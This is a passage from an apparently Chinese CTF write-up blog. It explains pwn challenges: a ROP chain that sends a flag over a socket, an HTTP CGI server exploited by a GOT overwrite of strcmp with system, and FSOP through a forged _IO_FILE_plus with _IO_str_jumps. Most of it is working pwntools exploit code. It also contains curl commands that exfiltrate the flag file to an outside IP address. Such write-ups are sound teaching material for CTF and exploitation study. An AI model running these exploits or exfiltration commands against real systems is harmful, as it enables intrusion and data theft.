payload+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(target)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0x30</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#socket(2,1,0)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">41</span>)+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">1</span>)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#connect(socketfd,server_addr,0x10)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">42</span>)+p64(pop_rdi)</span><br><span class="line">    payload+=p64(<span class="number">1</span>)+p64(pop_rsi)+p64(socket_addr)</span><br><span class="line">    payload+=p64(pop_rdx)+p64(<span class="number">0x10</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(target)+p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">    payload+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload=payload.ljust(<span class="number">0x1a0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line">    payload+=p64(<span class="number">0x0100007f901f0002</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">    payload=payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>注意server_addr的格式，其中ip地址和端口号都得反着写。</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>第一看这么多的伪代码，看了一个下午才看明白，然后写脚本又花了很长时间，很麻烦，但也知道了很多东西。</p>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>漏洞并不难以利用，但关键的是在茫茫码海中找见他，找见就很轻松了，漏洞主要来源于一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#得到<span class="function">elf_addr</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">( type == <span class="number">102</span> )</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> ( a5 &gt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( *(__int64 *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] &lt;= <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(</span><br><span class="line">              buf,</span><br><span class="line">              <span class="string">&quot;Let us look. Oh! That is %p -&gt; \&quot;%s\&quot;.\n&quot;</span>,</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]],</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]]);</span><br><span class="line">            v9 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            send(acceptfd, buf, v9, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">#任意地址写</span><br><span class="line"><span class="keyword">if</span> ( type == <span class="number">241</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a5 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        *(_QWORD *)(*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] + *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">4</span>]) = *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">6</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf, <span class="string">&quot;All right.I know what you say.\n&quot;</span>);</span><br><span class="line">        v11 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">        send(acceptfd, buf, v11, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是报文的目录的参数格式，在传参的时候需要base64编码（别问我怎么知道的），但是不能直接传编码后的字符串，得把后面的等号去掉才行（对比别人的wp发现的）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr1;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr2;</span><br><span class="line">    <span class="keyword">uint64_t</span> write_for_addr;</span><br><span class="line">&#125;</span><br><span class="line">type==<span class="number">0xf1</span>&amp;&amp;a5&lt;=<span class="number">2</span>:</span><br><span class="line">    *(addr1+addr2)=write_for_addr;</span><br><span class="line">type==<span class="number">0x88</span>&amp;&amp;a5&lt;=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,*(addr1+addr2))</span><br><span class="line">type==<span class="number">0x66</span>&amp;&amp;a5==<span class="number">0</span>&amp;&amp;addr1&lt;=<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p-&gt;%s&quot;</span>,(&amp;off_6140[addr1]),(&amp;off_6140[addr1]))</span><br><span class="line">type==<span class="number">0x12</span>&amp;&amp;addr1==<span class="string">&#x27;ping&#x27;</span>&amp;<span class="built_in">strlen</span>(&amp;addr2)&lt;=<span class="number">0xf</span></span><br><span class="line">        show</span><br></pre></td></tr></table></figure>

<p>然后利用上面代码的漏洞对got表发起攻击把strcmp改成system,但是注意不能system(“/bin/sh”),首先是shell的输入输出没有和socket绑定，其次当我们再次发送报文的时候会fork一个新进程来处理我们的报文，而不是发送给shell，所以需要反弹shell或者反弹flag,有很多反弹shell的命令但都没用，有两个反弹flag的命令能用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;curl 47.107.28.194/`cat flag`&#x27;)</span><br><span class="line">system(&#x27;curl -X POST -F \&quot;flag=@/flag\&quot; 47.107.28.194:8080&#x27;)</span><br></pre></td></tr></table></figure>

<p>最后的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># ip=&#x27;127.0.0.1&#x27;</span></span><br><span class="line"><span class="comment"># port=4000</span></span><br><span class="line">ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port=<span class="number">27718</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload1=p32(<span class="number">1</span>)+p32(<span class="number">0x66</span>)+p64(<span class="number">4</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload1=base64.b64encode(payload1)</span><br><span class="line">payload1=payload1.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload1)</span><br><span class="line"><span class="built_in">print</span> url1</span><br><span class="line">sh.send(url1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let us look. Oh! That is &#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x4070</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload2=p32(<span class="number">1</span>)+p32(<span class="number">0x88</span>)+p64(elf_base)+p64(<span class="number">0x6070</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2=base64.b64encode(payload2)     </span><br><span class="line">payload2=payload2.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url2=url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload2)</span><br><span class="line">sh.send(url2)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK! I give you some message!\nMessage: &#x27;</span>)</span><br><span class="line">printf_addr=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">strcmp_got=elf_base+elf.got[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload3=p32(<span class="number">2</span>)+p32(<span class="number">241</span>)+p64(strcmp_got)</span><br><span class="line">payload3+=p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line">payload3+=p32(<span class="number">0x22</span>)+<span class="string">&quot;curl 47.107.28.194/`cat flag`&quot;</span></span><br><span class="line">payload3=base64.b64encode(payload3)     </span><br><span class="line">payload3=payload3.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url3=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload3)</span><br><span class="line">sh.send(url3)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;All right.I know what you say&#x27;</span>)</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对pwn理解的更深了，说白了就是对指定的ip和端口发起socket连接，然后把sh.send的内容发送给这个端口的应用。</p>
<p>最近做题感觉漏洞利用简单，代码审计困难的题目越来越多。</p>
<h2 id="FShuiMaster"><a href="#FShuiMaster" class="headerlink" title="FShuiMaster"></a>FShuiMaster</h2><p>存在off by null漏洞，但只能申请largebin的堆块，所以可以进行larginbinattack，然后largebin上申请到的堆块可以泄露libc地址，在堆上布置然后打io_list_all就行了，重点讲一下io_list_all，我的主要学习来源是ctfwiki，对io_list_all的攻击也叫作FSOP.</p>
<p>在讲解FSOP前先讲一讲io_file结构，之前在stdout泄露libc基地址的时候讲过，但不是很深入，这里再梳理一次</p>
<p>io_file是一组织io操作的文件结构体，当打开有io操作的设备时就会生成对应的io_file结构体,比如stdout,stdin,stderr，io_file代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>file主要是对设备io操作的一些信息，vtable是一个虚表，里面记录了很多的函数地址，在io操作的时候会拿vtable里的地址跳转执行，据ctfwiki所说，在libc2.23的情况的下可以直接修改io_file_plus的vtable地址，可以伪造一个vtable然后修改io_file_plus的vtable地址指向我们的伪造的vtable(任意地址写)，然后对vtable的使用情况填上ogg或者system_addr,这种方法只适合在Libc2.23使用（在libc2.23下vtable表是不可以写入的，所以不能修改vtable里的内容）。</p>
<p>注意io_file file并不是一个指针而是给他实际分配了空间io_file_plus的完全体实际上是这样的,其中vtable相对于io_file_plus的偏移是0xd8。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">file</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>程序打开了很多设备代表着有很多的io_file_plus结构体，这些结构体以链表进行组织，其中next域是file的_chain，这个链表是单链表，链表头记录在io_list_all中，其中一般的链表头的io_file_plus是stderr</p>
<p>上面说了libc2.24以后不能伪造vtable了，主要是因为当使用vtable的时候就会对vtable进行范围检查，vtable得在这个范围内，虽说限制了vtable，但也存在漏洞，这个范围内也有很多我们可以利用的虚表，比如io_str_jumps或io_wfile_jumps他们里面也全部记录着函数指针，我们可以把vtable指向这两个地方比如io_str_jumps</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中_IO_str_overflow和IO_str_finish是我们主要利用的函数指针，_IO_str_overflow和IO_str_finish都存在相对地址调用，如_IO_str_overflow</p>
<h4 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h4><p><code>new_buf= (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>最后会调用fp+0xe0,然后参数是new_size,这个也是通过fp的内容计算出来的,下面是poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps</span><br><span class="line">fp+<span class="number">0xe0</span>=system</span><br></pre></td></tr></table></figure>

<p>题目构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">pay+= p64(<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">3</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>只要fp这样构造然后调用_IO_str_overflow的时候最后就会执行system(‘/bin/sh’),现在问题是如何伪造io_file_plus以及如何执行_IO_str_overflow</p>
<p>上面提到过的，io_file_plus的头结点储存在io_list_all里面，所以可以覆盖io_list_all为我们可以控制的一段内存，比如堆，也就是说我们伪造了stferr的io_file_plus，然后在这段内存中构造上面的内容就好了。</p>
<p>函数IO_flush_all_lockp 会刷新所有文件流，内部会调用vtable+0x10的函数，当把vtable覆盖成io_str_jumps后vtable+0x10就是_IO_str_overflow函数地址，所以只要调用io_flush_all_lockp就好了，在程序main函数返回或者执行exit(0)或者执行abort时会调用io_flush_all_lockp函数，所以在fake_io_file_plus后触发io_flush_all_lockp就好了。</p>
<p>这是_IO_str_overflow的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= 